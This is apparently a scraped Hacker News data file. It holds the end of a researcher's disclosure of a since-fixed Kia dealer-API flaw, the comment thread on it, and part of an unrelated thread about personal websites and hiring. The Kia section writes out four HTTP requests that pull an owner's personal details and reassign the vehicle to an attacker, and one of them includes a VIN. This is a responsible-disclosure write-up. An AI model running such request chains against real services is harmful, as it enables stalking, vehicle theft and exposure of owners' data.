/apps/services/kdealer/apigwServlet.html HTTP/1.1 Host: kiaconnect.kdealer.com Httpmethod: POST Apiurl: /prof/authUser { \"userCredential\": { \"userId\": \"normal.kia.user@gmail.com\", \"password\": \"Fakepass123!\" } } Using the dealer account we created, we'll auth through the /prof/authUser endpoint to obtain a session token. (2) Fetch Victim’s Email Address and Phone Number POST /apps/services/kdealer/apigwServlet.html HTTP/1.1 Host: kiaconnect.kdealer.com Httpmethod: POST Apiurl: /dec/dlr/dvl Appid: 123e4567-e89b-12d3-a456-426614174000 { \"vin\": \"VIN\" } With the added session token header, we are able to access all dealer endpoints on the kiaconnect.kdealer.com website and can retrieve the victim's name, phone number, and email. (3) Modify Owner’s Previous Access using Leaked Email Address and VIN number POST /apps/services/kdealer/apigwServlet.html HTTP/1.1 Host: kiaconnect.kdealer.com Httpmethod: POST Apiurl: /dec/dlr/rvp Appid: 123e4567-e89b-12d3-a456-426614174000 { \"vin\": \"VIN\", \"loginId\": \"victim_email_leaked@gmail.com\", \"dealerCode\": \"eDelivery\" } We send this request to demote the owner of the vehicle so that we can add ourselves as the primary account holders. We must send the victim's email here, which we obtained in step two. (4) Add Attacker to Victim Vehicle POST /apps/services/kdealer/apigwServlet.html HTTP/1.1 Host: kiaconnect.kdealer.com Httpmethod: POST Apiurl: /ownr/dicve Appid: 123e4567-e89b-12d3-a456-426614174000 { \"vin\": \"5XYRK4LFXMG016215\", \"loginId\": \"attacker@gmail.com\" } Finally, we'll assign our attacker-controlled email as the primary owner of the vehicle. This will allow us to send arbitrary commands to the vehicle. The above four HTTP requests could be used to send commands to pretty much any Kia vehicle made after 2013 (see \"Vehicles Affected\" table for specifics) using only the license plate. From the victim's side, there was no notification that their vehicle had been accessed nor their access permissions modified. An attacker could resolve someone's license plate, enter their VIN through the API, then track them passively and send active commands like unlock, start, or honk. The impact here was really obvious to us and we reported it to Kia immediately, but while they were working on a fix we decided to build a proof of concept dashboard that better demonstrated the impact of this vulnerability. Creating License Plate Takeover Proof of Concept The goal of our proof of concept UI was to simply have a dashboard where an attacker could (1) type in the license plate of a Kia vehicle, (2) retrieve the owner's PII, then (3) execute commands on the vehicle. Because we were adding the victims’ vehicle to our attacker controlled account, we decided to build the proof of concept to have an “exploit” and “garage” page. The exploit page would be used to actually take over the vehicles, then the garage page would be used to issue commands and locate the vehicles. It worked via the following: The License Plate to VIN form uses a third-party API to convert license plate number to VIN The Takeover button would do the 4-step process to takeover a victim’s vehicle using the retrieved VIN from the license plate number, by (1) generating a dealer token via the login form, (2) retrieving the email/phone number from the victim’s account, (3) demoting the account owner to an account holder, (4) adding ourselves as the primary account holder. The Fetch Owner button would passively tell us the name, email, and phone number of the victim The Garage tab would allow us to list and execute commands on compromised vehicles After building this tool, we recorded a proof of concept using a locked rental Kia. This video included at the start of the blog shows us taking over a vehicle using our phone, then being able to remotely lock/unlock, start/stop, honk, and locate the vehicle. Hacking a car using just the license plate Executing commands on the compromised vehicle Conclusion Cars will continue to have vulnerabilities, because in the same way that Meta could introduce a code change which would allow someone to takeover your Facebook account, car manufacturers could do the same for your vehicle. Thanks for reading! (shouts: teknogeek, dnz, ziot, xEHLE, umasi, shubs, computeruser, ic3qu33n) Timeline 06/07/24 04:40 PM UTC - Inquiry sent to Kia team on correct place to report vulnerabilities 06/10/24 01:21 PM UTC - Response by Kia Team 06/11/24 10:41 PM UTC - Report sent to Kia 06/12/24 06:20 PM UTC - Email to bump ticket due to criticality 06/14/24 06:00 PM UTC - Response from Kia team that they were investigating 06/18/24 04:41 PM UTC - Email to bump ticket due to criticality, added screenshots of tool 06/20/24 02:54 AM UTC - Email to bump ticket, included screenshot of license plate to access tool 08/12/24 12:30 PM UTC - Email to bump ticket, asking for update 08/14/24 05:41 PM UTC - Response from Kia team indicating they had remediated the vulnerability and were performing testing 09/26/24 08:15 AM UTC - Disclosed vulnerability publicly after validating it had been remediated Find me on:twitter: https://twitter.com/samwcyodiscord: zlz",
    "commentLink": "https://news.ycombinator.com/item?id=41658733",
    "commentBody": "Hacking Kia: Remotely Controlling Cars with Just a License Plate (samcurry.net)92 points by speckx 4 hours agohidepastfavorite60 comments tptacek 50 minutes agoThis won't have nearly the same impact, but when you're considering how vulnerabilities like this might influence your future purchasing decisions, remember that Kia's decision to omit interlocks from their US vehicles (but not Canadian ones!) led to a nationwide epidemic of Kia thefts so large it fed a crime wave, something a number of US cities are suing Kia over. If you've read about carjacking waves in places like Milwaukee and Chicago: that was largely driven by a decision Kia made, which resulted in the nationwide deployment of a giant fleet of \"burner\" cars that could be stolen with nothing but a bent USB cable. reply adolph 15 minutes agoparent> If you've read about carjacking waves in places like Milwaukee and Chicago: that was largely driven by a decision Kia made, which resulted in the nationwide deployment of a giant fleet of \"burner\" cars that could be stolen with nothing but a bent USB cable. \"A nationwide epidemic of Kia thefts\" seems to be a natural consequence of decreased security. However, that carjacking in Milwaukee and Chicago specifically would follow from a nationwide omission of interlocks is not obvious as the vehicles are easily stolen without the need for personal confrontation. What is the connection of Kia interlocks to carjacking in Milwaukee and Chicago? reply Terr_ 9 minutes agorootparentI think parent-poster means that the easily-stolen cars were being used as a tool for committing carjacking as a further crime, where the stolen car gets used to chase/bump/stop other more-desirable targets on the highway. This is in contrast to arriving in their own vehicle, which might be traced back to them. An alternate explanation is that they meant to write something like \"theft\" and accidentally put down \"carjacking\" instead. reply aftbit 37 minutes agoprevWait a moment, the key vulnerability appears to be that anyone could register as a dealer, but also any dealer could lookup information on any Kia even if they didn't sell it or if it was already activated!? That seems insane. What if a dealership employee uses this to stalk an ex or something? reply lambada 3 minutes agoparentA Kia authorised dealer being able to look up any Kia has some very useful benefits (for the dealer, and thus Kia). If a customer has moved into the area and you’re now their local dealer they’re more likely to come to you for any problems, including ones involving remote connectivity problems. Being able to see the state of the car on Kia’s systems is important for that. Is this a tradeoff? Absolutely. Can you make the argument the trade off isn’t worth it? Absolutely. But I don’t think it’s an unfathomably unreasonable decision to have their dealers able to help customers, even if that customer didn’t purchase the car from that dealer. reply bityard 59 minutes agoprevWell, I am already pretty firmly against buying any car that requires you to create an account online to \"activate\" the vehicle. But I definitely won't buy another Kia anyway, based on the fact that our last one burned a quart of oil every thousand miles WELL before it hit the 100k mark. reply barbazoo 54 minutes agoparent> car that requires you to create an account online to \"activate\" the vehicle I have a 2023 Kia and that's not necessary. You only need the account if you want to use the optional online services. reply sahmeepee 48 minutes agorootparentAs the article says, you don't need an active subscription to be vulnerable. In this case it seems that if the model supports the features at all, you are vulnerable. This makes sense, because they want people to be able to subscribe to their services later without having to visit the dealership, so they make it possible to remotely enable the service. I'm not sure if you can buy a tinfoil hat for a car. reply mikepurvis 14 minutes agorootparentIt should be possible to physically disable the cellular modem in the vehicle, wherever that is. I have a 2020 Volvo that is definitely online, waiting for me to activate some pricey online subscription that I don't want or need. Would be nice to have a organized online database of how to disconnect various \"smart\" devices— cars, TVs, appliances, etc. reply nis0s 43 minutes agorootparentprevI was just going to say the same as it's stated pretty early in the article > These attacks could be executed remotely on any hardware-equipped vehicle in about 30 seconds, regardless of whether it had an active Kia Connect subscription. If this should tell companies anything is that most of these services should be opt-in instead of opt-out in favor of security and privacy. reply 01HNNWZ0MV43FF 47 minutes agorootparentprevOtherwise it spies on you with no account reply randomstring 15 minutes agoprevThe obvious next step is to crawl the whole database of vulnerable Kia cars and create a \"ride share\" app that shows you the nearest Kia and unlocks it for you. reply mlsu 37 minutes agoprevThere are no new cars on the market today that don't have a slew of connected \"\"\"features\"\"\", right? Will it ever be possible to have a non-connected car? If so, how? What would it actually take? This is not a ranty rhetorical question -- I'm actually wondering. reply akyuu 2 minutes agoparentIt would be interesting to have a list of modern cars without these kind of connected features, but I haven't found any. reply MarkusWandel 28 minutes agoparentprevDon't know about 2024, but my 2023 Honda Civic EX-B (Canadian market) is actually pretty old school. Yes, it has the keyless unlock and even a remote engine start button on the keyfob (can be disabled, thankfully - car is parked inside and we have kids!) But no cellular connectivity, no wifi, and all the touchscreen stuff is \"extra icing\" - all the controls you need are there in physical form except for some radio and cell phone call functions. Yes, the car may be vulnerable to signal boost kind of attacks (to pretend the keyfob is nearby when it's not) and possibly the \"pop off a headlight and get into the CANbus\" attack. But no cloud dependency and no way for the cloud to reach in and mess things up. Also, the software it does have seems \"debugged\" based on a year of using it. reply gen3 15 minutes agorootparentYour Honda almost certainly has HondaLink, which connects via cellular https://www.honda.ca/en/hondalink/hondalink-2?year=2023&mode... and they're probably selling your location data to databrokers https://www.eff.org/deeplinks/2024/03/how-figure-out-what-yo... reply MarkusWandel 7 minutes agorootparentGlad to say it doesn't. Only the top-of-the-line \"Touring\" model is shown as compatible with HondaLink. reply r00fus 32 minutes agoprevAs a Kia owner, this was what I was hoping for immediate term, FTA: \"These vulnerabilities have since been fixed, this tool was never released, and the Kia team has validated this was never exploited maliciously.\" Kia still has a lot of work to do because of bad decisions, but at least my vehicle isn't ripe for theft/abuse. reply sxcurity 4 hours agoprevStop connecting vehicles to the internet pls & thanks reply kkfx 34 minutes agoparentWell... There is no reason to have a middleman like the OEM, so the car could be connected just with the formal owner (i.e. with a personal subdomain o dyndns), FLOSS stack under users control and some hard limits (like you can't act on the car if it moving and so on). reply yupyupyups 1 hour agoparentprevOk, I wont. reply carabiner 1 hour agorootparentThanks. reply AdamJacobMuller 55 minutes agoparentprevIf it's done well, there are some useful features there. App unlock, remote start + remote temperature control. All very useful. I couldn't imagine buying a car without carplay now. reply rwmj 53 minutes agorootparentSorry no. App unlock is a stupid anti-feature, do people genuinely think it's better than pressing a keyfob? Remote start is very useful in very cold climates, but guess what, it doesn't need a phone, an app or the internet. My friend in a snowy part of Japan had a radio keyfob that did this literally 10 or more years ago. As long as you were within about 100 ft of the car you could switch it on and turn on the heaters. reply AyyEye 46 minutes agorootparentI installed an aftermarket remote start kit in the 90s. It cost less than $100. reply kube-system 15 minutes agorootparentMany of the earlier aftermarket remote start kits were cheap and simple because the vehicles had fewer security features. They are more complex and expensive today, and some are questionable in their implementation. reply somehnguy 37 minutes agorootparentprevRemote start via phone is still useful in cold climates. While getting a ride with a friend to my car left at some location I've been able to start & get it warmed up before we even got off the highway. It was nice and warm by the time I arrived to it. With only a keyfob it would have still been ice cold. Absolutely not a necessary feature, but I miss it (free MyLink subscription expired and I won't pay for it). reply Kirby64 35 minutes agorootparentprevAutomatic unlock with a phone is not an anti feature. If it replaces your key fob completely, then it’s one less thing you have to carry. I haven’t carried keys of any kind for… 6 years at this point? Also, remote start/temp control that works no matter the distance as long as there’s internet connectivity is superior to a radio based implementation. There’s plenty of places that are largely RF impermeable, or otherwise distance is too far. If you’re in a store, 100ft is barely any distance, especially with the layers of concrete in the way. reply toomuchtodo 41 minutes agorootparentprevI use my Tesla app to lock and unlock our vehicles all the time, in all cases outside of RF range. I have a Twilio number wired up I can call, enter a 10 digit code, and it will unlock and enable the vehicle to drive in the event I have lost my phone and keycard. These are material quality of life improvements. Physical access is required to exploit any unauthorized access to the vehicle. What are you going to do? Steal my change? reply roywiggins 37 minutes agorootparentIs it really so much better than an RF keyfob that it's worth connecting your car to the Internet for? reply toomuchtodo 36 minutes agorootparentYes, I accept the risk and threat model. RF fobs are compromised frequently as well. Unless you rip the cellular module out of my vehicles, I will find it, and someone is just going to break the window if they want in. Edit: Non connected cars for the risk adverse, connected cars for those with the risk appetite. The market will self sort, even if telematics requires more regulatory oversight (they do!). https://www.google.com/search?q=fob+relaying+theft+attack reply potato3732842 5 minutes agorootparent>Yes, I accept the risk and threat model. >Edit: Non connected cars for the risk adverse, connected cars for those with the risk appetite. The market will self sort, even if telematics requires more regulatory oversight (they do!). Seems contradictory. What risk are you actually accepting if we're all forced to kick in for some regulator that protects you from the majority of the risk? roywiggins 33 minutes agorootparentprevOf course, with this Kia attack, it didn't matter if you had never used or activated the feature, it was still vulnerable. With keyfobs you can just not use it or destroy it if you are worried about relay attacks. Connecting every car to the Internet at all times just in case their owners might want to activate a remote start feature at some point is nuts. reply natch 17 minutes agorootparentprevNice lifehack; I'm going to do this. Please share more if you have them. reply lowkj 41 minutes agorootparentprevCarPlay doesn't use your car's internet, it uses your phone's internet. That's part of the whole beauty of it. reply natch 22 minutes agorootparentPlease explain how in your mind are they doing remote climate control, then? reply mplewis 9 minutes agorootparentThrough the car’s cellular connection. reply krferriter 32 minutes agorootparentprevYeah, important distinction reply morkalork 10 minutes agorootparentprevIf the car manufacturer can remote unlock and start your car for you, it can be abused by a hacker in same way. It's the exact same argument against backdoors in encryption for the government, if a backdoor works for them, it'll work for hackers too. reply FriedPickles 47 minutes agorootparentprevUnlock via Bluetooth is perfectly viable without internet connection (unless you mean unlocking it for someone else?). Remote start and temp control should probably work from a few hundred feet away. If only phones had a longer range local radio, perhaps something like Zigbee. Maybe WiFi direct? reply natch 24 minutes agorootparentprevWhy do you give CarPlay credit for those features? No need for CarPlay for any of those. What do you get from CarPlay that you don't get from a connected car without CarPlay? reply yjftsjthsd-h 13 minutes agorootparent> What do you get from CarPlay that you don't get from a connected car without CarPlay? Software quality and security updates on the internet-facing component. reply whiplash451 43 minutes agorootparentprevIt just doesn’t have to be the internet. reply AyyEye 49 minutes agorootparentprevIt's never well done. reply bigstrat2003 23 minutes agorootparentIt was well done on my previous car and current car. So it would appear that your claim does not hold. reply natch 20 minutes agorootparentprevIt's very well done in my car. reply not_a_dane 13 minutes agoprevHow much time would you need to redevelop KIAtool with AI? reply jmyeet 12 minutes agoprevWhere's the strict product liability here? Like, if Kia is making a car that's easy to steal and it gets stolen, why isn't that Kia's fault and they're responsible for the damages? We're talking gross negligence here. There have been demonstrations of hacking cars remotely to gain control of it. You could quite literally kill someone this way. This should 100% be the responsibility of the car maker. Why do we let these companies get away with poor security? It's well beyond time we hold them financially and legally responsible for foreseeable outcomes from poor security practices. That doesn't mean any vulnerability incurs liability necessarily. A 0day might not meet the bar for gross negligence. But what if you were told about the vulnerability and refused to upate the software for 2 years because a recall like that costs money? Or what if you released software using versions with known vulnerabilities because you don't want to pay for upgrading all the dependencies? reply diego_moita 51 minutes agoprevOk, lesson learned. Thank you. I have a Kia Niro EV Wind 2024 and just cancelled my account at Kia Connect. Yes, I felt stupid. But a little less stupid now. Edit: does anyone know how I could disable Kia's remote access to my car? Is there any antenna I could cover with tin foil or a chip that can be disconnected? reply aftbit 38 minutes agoparent>These attacks could be executed remotely on any hardware-equipped vehicle in about 30 seconds, regardless of whether it had an active Kia Connect subscription. reply bluSCALE4 32 minutes agoparentprevDon't feel stupid, feel a little angry. The only thing you could have done to prevent this was not buy a Kia. reply meindnoch 55 minutes agoprevWhat if we had laws that required car manufacturers to have software with slightly better quality than the utter syphilitic diarrhea they currently ship? reply dopylitty 42 minutes agoparentnext [8 more] [flagged] psunavy03 40 minutes agorootparentToday I learned that counterintelligence and sabotage concerns about a major geopolitical rival are \"xenophobic trade war reasons.\" reply wahern 21 minutes agorootparentI think you misunderstood the insinuation.[1] I believe they're suggesting that otherwise legitimate vulnerability concerns are discounted in favor of a laissez faire market policy unless and until the concerns are framed by a xenophobic narrative. IOW, xenophobia trumps capitalism, but not measured security concerns. [1] But that's why sarcasm is usually frowned upon on HN. reply bluSCALE4 27 minutes agorootparentprevWhy would the average consumer car about intelligence of a foreign state? I, for one, have no fear of China presently but the climate in the USA isn't very pro free speech. reply kube-system 21 minutes agorootparentThey don't (at least, not in peace time), but the US government does. They also buy cars. Also the concerns of the average consumer aren't a really good barometer for what should be legal. Most consumers gladly sign up for services that violate their privacy, because they don't understand the consequences at the time of purchase. Also people are pretty bad at estimating risks of unknown certainty even when they do know about them. If 'buyer-beware' worked, there would be no need for consumer protection law... but this segment of the law has originated from necessity. reply lostmsu 25 minutes agorootparentprevYou missed the obvious elephant in the room with the word sabotage. reply potato3732842 22 minutes agorootparentprevCars are regulated to high heaven. They don't regulate software quality because the unholy union of big business and government that is the current US auto sector and its regulators have yet to find a way or need to do so that benefits them. reply almatabata 14 minutes agorootparentIf it only impacted automakers they might do it. However if you apply this standard to cars you will have to apply it to a lot of other sectors. After all why stop at car makers. Why should other appliances not get the same treatment like IoT as well? A lot of other companies would hate to have this standard applied to them hence they lobby against it as well. reply alexandersvozil 55 minutes agoprev [–] i cannot connect to kia anymore, would have bot worked in me reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "In June 2024, vulnerabilities in Kia vehicles were discovered, allowing remote control over key functions using only a license plate, affecting models from 2014 to 2025.",
      "Hackers exploited issues in Kia's infrastructure, including the owners.kia.com website and Kia Connect iOS app, to execute internet-to-vehicle commands and obtain personal information.",
      "The vulnerabilities have since been fixed and were never exploited maliciously, with a detailed timeline showing Kia's response and remediation process."
    ],
    "commentSummary": [
      "Kia's omission of interlocks in US vehicles has led to a significant increase in thefts, resulting in a crime wave and multiple lawsuits from various cities.",
      "Vulnerabilities in Kia's system allow remote control of cars using just a license plate, raising serious security and privacy concerns.",
      "The situation has sparked discussions on the necessity of connected features, potential solutions like disabling cellular modems, and the broader issue of software quality and regulatory needs in modern cars."
    ],
    "points": 92,
    "commentCount": 60,
    "retryCount": 0,
    "time": 1727360527
  },
  {
    "id": 41656015,
    "title": "Did you personal website help you get hired? Tell about it",
    "originLink": "https://news.ycombinator.com/item?id=41656015",
    "originBody": "Context: I&#x27;m a senior dev, well-employed, and hopefully won&#x27;t be looking for a job anytime soon. I&#x27;m just working on a blog&#x2F;website as a hobby side-project, and really could use some external motivation to keep going (instead of scrolling through social media and watching TV). Also I can&#x27;t decide what to write about, and whether to make it more nerdy or more professional.",
    "commentLink": "https://news.ycombinator.com/item?id=41656015",
    "commentBody": "Did you personal website help you get hired? Tell about it92 points by throwaway844535 10 hours agohidepastfavorite77 comments Context: I'm a senior dev, well-employed, and hopefully won't be looking for a job anytime soon. I'm just working on a blog/website as a hobby side-project, and really could use some external motivation to keep going (instead of scrolling through social media and watching TV). Also I can't decide what to write about, and whether to make it more nerdy or more professional. valbaca 1 minute agoJust write. It might come up. My personal blog came up in several of my interviews as they will likely at least Google your name. reply rwieruch 7 hours agoprevWhen I began as a junior web developer in 2014, I also started blogging [0] about React.js on the side. Despite hearing that \"blogging is dead,\" I kept at it because I enjoyed sharing what I was learning as a junior dev. Three years later, I began receiving job offers through my blog, which led me to try freelancing as a web developer. Fast forward seven years, and I've never had to actively seek out projects, because clients have consistently reached out to me via my website. In fact, blogging has allowed me to stay fully booked as a freelance web developer. I had freelance gigs at governments, at a DAO, at enterprise companies and startups which reached from code monkey positions to lead positions. Would I do it again? Absolutely. But would I start blogging in 2024 just to get job offers? Probably not. The developer content landscape has changed significantly, with many more people now blogging. However, if your goal is personal growth and learning, a well-maintained blog can still be a valuable way to attract clients. AMA :) [0] https://www.robinwieruch.de/ reply donalbrecht 3 hours agoprevMany years ago, I was basically an it guy in a rust belt city with a slightly inflated title and no cs degree. I started blogging about interactive web development as I was teaching myself. A year later I decided to look for a new job. To my surprise, that website got me past pretty much every first round, and within 2 weeks of starting to send applications I had 5 job offers at 2-3 times my current salary. I relocated to Chicago and the entire trajectory of my career changed. I will always recommend blogging or some form of content creation. Especially for someone thinking of a career pivot. It keeps you focused on deliverable products from your learning and experience. Helps keep you consistent if you have a posting schedule. Creates tangible evidence of your skills and experience. And perhaps most importantly. It really improves your communication skills around the problem space which is a huge benefit. reply slig 7 hours agoprevYes! Back in 2002, I made a web version of the Zebra Puzzle, in Portuguese. It went viral and 20 years later I still have a Zebra Puzzle website [1]. That game and, this \"micro SaaS\" [2] that I made in 2003, helped me get my first job, at IBM. I was 19 at that time. [1]: https://www.zebrapuzzles.com/ [2]: https://web.archive.org/web/20030204164816/http://www.hipert... reply nickjj 7 hours agoprevNearly every single professional opportunity that has come my way was through my blog. A few months ago I wrote a post on the butterfly effect of having a blog for ~9 years, it covers some of the more interesting things: https://nickjanetakis.com/blog/the-butterfly-effect-of-havin... reply ashdnazg 7 hours agoprevIn my case it definitely didn't (so far). I'm not a prolific writer and the subjects are just what interested me at that point in time and I feel should be public. Unfortunately, there aren't many companies looking for experts in palindromes. Looking at the websites shared here, it seems like web development tutorials and tips are the way to go if you want to get hired. I, however, recommend writing about whatever gets you excited and you want to share with the world. Especially since you're happy in your current place. reply flpm 5 hours agoprevWhen I am hiring I always look at personal websites if they are available. They provide a more realistic picture of the person and their interests, the resume is too formal an optimized for marketing. If you have a site, and it has content, and shows more about what you are interested in, it counts a lot for me. Extra points if it links to code in GitHub. But not any website will do, if it feels like an 5-minute thoughtless effort, with an empty template and a single entry dated 4 years ago saying \"TODO\", then it will count against you. reply csswizardry 8 hours agoprevHugely instrumental in my career. Landed me my first ever job (2008) and has been responsible for underpinning most of my consultancy career (2013–now): https://csswizardry.com/ As long as one sticks with it, I cannot overstate the power of a good personal website. > Also I can't decide what to write about, and whether to make it more nerdy or more professional. As with most decisions, just make one. You can always change your mind later. reply ggambetta 7 hours agoprevIt kind of did. Back in 2008 or so I wrote a series of articles about multiplayer networking [1], which over time became suprisingly popular, but nothing much happened otherwise. Until 2014, when they directly led to Improbable [2] reaching out and ultimately poaching me from Google (at least for a few years). [1] https://gabrielgambetta.com/client-server-game-architecture.... [2] https://improbable.io reply iercan 6 hours agoparentWhen I was doing presentations for university projects as a student, I used your articles as references, very useful! reply ggambetta 1 hour agorootparentHappy to hear :) reply xena 7 hours agoprevYes, it's been the reason I've been hired for the last 5 years: https://xeiaso.net It is now the reason I get consulting work. reply xrd 6 hours agoparentI love your blog! Most blogs are clearly firewalled from the human that wrote them. But, yours almost feels like you take a bit of your lifeforce and somehow imbue it into the blog itself. Those posts are alive. I hope it isn't like a scene from the Dark Crystal where the Skeksis (your blog) are sucking your (urRu) life force from you. If so, I'll go find a landstrider and see what I can do. reply superfamicom 3 hours agoprevI run several sites but 2 of them tend to come up more in interviews and are all linked from my GitHub profile: https://sfc.fm - A website to listen to Super Nintendo music in the browser. Folks usually find this more cool, talk about WASM and covers several common things we can skip over talking about items like RESTful APIs and random JavaScript questions. https://wiki.superfamicom.org - A website for all things programming the Super Nintendo. This tends to be more interesting to management folk (which is interesting on its own) but tends to be a point in an interview where the \"can this person actually program\" questions end and culture questions start getting more specific. Recruiters also tend to latch onto this one as well. No one ever mentions my blog, but I don't post all that much and the content is technical, but usually very niche. reply ljf 9 hours agoprevBack in 1999 I started a Geocites site just for fun, which led me to making various sites to either promote or sell things I found interesting (namely Fresnel lenses). From this I started and ran a few forums - just to see what would happen, but some that got fairly big for the time. This totally got me my first job - I hadn't mentioned it at all on my CV, but I was able to talk at length about it once I realised it was relevant to the role. Going forward I blogged and tried various things on social media, again just for fun - but I was regularly able to either apply learnings to my roles, or more likely just have interesting other examples to refer to in interviews. It meant I understood FTP, buying (and selling) domain names, DNS, basic coding and most importantly had a good handle of what could go wrong (e.g. people abusing image hosts and url shorteners that I played with). Note I am non-technical - I was a moderator>researcher>producer>product owner>Chief Product Manager during this time - but the little amounts I learnt about web technologies in my own time, helped me to better talk with my technical colleagues and to my non-technical ones. reply technothrasher 8 hours agoparentIf we're going back to the 90's, I didn't get a job from my personal website but I did have a local newspaper article written about me in 1997 because I had a personal \"home page\". I waxed on and on about the web being an empowering force that allowed everybody to publish their thoughts and ideas to the masses, rather than having major media sources control the dialog. It was a nice, optimistic vision, even if it hasn't exactly turned out that way. The article made me a local celebrity for about a week, as everybody wanted to stop me in the street and know all about it. reply jonathanlydall 8 hours agoprevI transitioned to being a professional software developer in 2012 and a hobby SPA website[0] essentially acted as a portfolio which I used to demonstrate I knew what I was doing to get my first software development job. During the interview they asked me lots of technical questions around the website, like why I chose particular solutions, what the trade-offs I made were and how I did certain things. Essentially, I just had to be able to show them I could technically discuss the website in detail and I guess also proving that it was I who did the work. What I also only realized a bit into the new job was that merely \"releasing\" a working project is in itself a bit of an accomplishment. [0]: https://mordritch.com/mc_rss/ reply sam_lowry_ 8 hours agoprevI once got a job as an IT Director in a media company because I was running a popular forum on the same software they used. But my personal website probably hurt me more than helped. reply m4l3x 8 hours agoparentCan you elaborate, how your personal website hurt you? reply lnsru 8 hours agorootparentBecause on personal blog personal opinion may appear. And personal opinion sometimes does not align with the right opinion. That’s where one loses karma points. That’s why I have paper diary instead of public blog. reply Kim_Bruning 8 hours agoparentprevThat sounds like a story! reply shared_ptr 7 hours agoprevI think this is one of those topics where most people will say post saying yes. But I think blogs mostly help if you write about a very niche topic that might attract the attention of a potential employer. Else Github would be a better source of guidance for the interviewer. These days you get technical challenges to test if they are what you expect (and many companies overdo this). reply heywoodlh 3 hours agoprevFor myself, my blog and GitHub activity were key points in my interviews that heavily influenced my previous two hires. > Also I can't decide what to write about, and whether to make it more nerdy or more professional. Personally, I use my blog to write about: - Niche things I run into that I want to document for myself - Things I’m working on that I think are cool - Opinions on why I do things a certain way I love reading other blogs that orbit around this type of content. One suggestion I would make is to focus on writing your blog for yourself instead of a fictional audience. That way your blog’s value is self-contained, rather than worrying about the value other people get out of it. Good luck! reply anon22981 5 hours agoprevMine did, but as a junior as with probably many others. The react based website was a demo in itself and it also was a portfolio demoing my other projects. It landed me my first part-time job in the field after I had been in university for around 6 months. At that time I had been really productive with kinda clever and cute projects - for example a desktop app that could search powerpoints and pdf files with keywords and present you the resulting pages in a nice-ish UI. (edit: java to parse the files and an Electron app to orchestrate it and provide an UI. It was shitty but it worked.) After I had been at uni for 1,5 years and a part-timer for a year I got several offers from some pretty cool IT companies when on job search. I’m sure the site with a decently sized portfolio helped then too: I had some nice-ish projects considering my junioirity and could demo them on the site. I took up one of the offers and still remain there. Haven’t updated the site once after I got this job, since I haven’t found that much motivation for personal projects anymore. :( reply j0hnyl 4 hours agoprevSo far everyone saying \"yes\" has anecdotes from the beginnings of a career that started a while ago. Website or not, it was easier to get hired then. Has anyone's website gotten them hired in the last 1-2 years? reply bradlys 3 hours agoparentIt’s a good point. I haven’t scrolled around much either but there’s going to be selection bias here. I made a portfolio website and had some projects on it. The projects got me hired but the portfolio website itself didn’t. Again, this was for my first post-college job. I shouldn’t have needed portfolio projects but even ten years ago - hiring for new grads was incredibly hard. It took me about nine months to land my first post grad job and another nine months to land my second. I had done 15 onsites to get my second offer! It has never been easy to get a job in this field in the last decade. reply jareklupinski 4 hours agoprevYup, back when I was studying, every business wanted to be \"on the net\", and i made a little bit of money for work that I only got after showing people my web site. It had my name on it, so they knew I could make something similar for them :) I keep mine updated more to have a place to track progress than a portfolio these days https://jarek.lupin.ski reply kiloshib 6 hours agoprevMind did, but I am a technical writer not a dev so take that with a grain of salt. During my job search, it was nice to have a portfolio to point to because I didn't have any \"official\" writing samples from my previous jobs (gov't). I wrote tutorials on some simple tech stuff - e.g., \"How to install [this tool] on [whatever OS]\" - as well as some thoughts on trying to learn computer science fundamentals as technical writer. It really helped in the interviews to be able to talk candidly about all the fun I had learning different things, and the process had given me a deeper understanding of the tech related to the job. reply btasker 8 hours agoprevI can't say for sure that it directly led to jobs, but my website has been brought up in a positive light during the recruitment process more than a few times. Because I write about technical things a lot, it's often been viewed as \"evidence\" that I'm an experienced technical writer as well as an engineer. But, it (and my github account) have also been flagged as \"risks\" by a recruitment agency though: I can be a bit sweary at times and they felt that having a project called F*ckAMP might put off potential employers. No-one else has cared though. But, to echo the advice that others are giving you - the \"power\" of my blog lies more in it being stuff that I want to write, rather than stuff that I'm writing because I think that it'll help my career. Deciding what to write about can be hard, and sometimes you'll find you hit a block and don't write about anything at all. Those are both fine, just write about stuff when you want to and don't pressure yourself to write \"just because\". reply throwaway346434 8 hours agoparent> they felt that having a project called F*ckAMP might put off potential employers. Do you really want to work with an employer who cares about this? Works both ways reply btasker 7 hours agorootparentYep, that's exactly my view on it. reply ratedgene 6 hours agoprevIf a candidate has a personal website or blog that can articulate to me their interests in the field or otherwise, I add points to them being a communicator and someone who can probably present or put together something that requires critical thinking. reply Maro 7 hours agoprevIt did not. I have an actively maintained website [1], but it never got me anything. In fact, I even removed GA from it, because I don't care whether people read it or not, I do it for my own enjoyment. Same for conference speaking, I never got a single good ping out of it (in that case, I stopped doing it, I hate flying). [1] bytepawn.com reply hwj 5 hours agoparentI really enjoy the mix of scientific, practical and personal notes on your blog. reply mattrighetti 7 hours agoprevWell I know for a fact that it did help me get noticed, a couple of recruiters reached out to me after reading some of my blogposts. Other than that, I think that in general it implicitly helped me because I’m definitely better at writing technical docs and that’s a nice perk for a software engineer. reply psyklic 8 hours agoprevYes! Also, there's no need for a blog unless you have a passion for writing. You can just post past projects and make it like a more engaging CV. - Making your website more unconventional will result in more variance of opinion. This can be really good if some people especially like it (ofc, others may especially dislike it!). - I consider my website as controlling the top Google result for my name. Also, my email uses my domain. So people I email will also likely visit my website, which hopefully leaves a better impression than LinkedIn would. - If I apply to something I care about, I can see in the logs that someone from there likely looked at it. So from that I can say it likely helped with grad school admissions, and certainly most clients have looked at it before hiring me (in fact many have mentioned it positively). reply okaleniuk 6 hours agoprevNot entirely \"hired\", but my site helped me to land a writing job. I've been writing interactive pieces on https://wordsandbuttons.online/ since 2017, and in 2021 Manning asked me if I wanted to write https://www.manning.com/books/geometry-for-programmers and, well, two years after it went to print. reply rupestrecampos 7 hours agoprevAfter +5 years working for companies building their own geospatial platform, I felt like I needed a portfolio for showcasing my skills to get a new job, without spending more than a few bucks. So I created https://car-viewer.streamlit.app/ and a few others that you may find in contacts link at top. The idea was to show and keep updated a massive (+250Gb) dataset on map on my own end to end using open source and proprietary tools within free tier limits. After releasing it I got interview invitations that led me to a new job. reply edmundsauto 4 hours agoprevI had a brochure like consulting site after I quit my last job. Despite only ever having one small client, that site convinced a big tech recruiter to tap me for an interview. I passed, took the job and moved. Completely changed the course of my life for the better. reply nunobrito 7 hours agoprevI didn't had a degree, didn't had formal education. But heck, had my software on the cover of paper magazines and was a recognized expert for a niche field of technology. Smart companies hire for talent 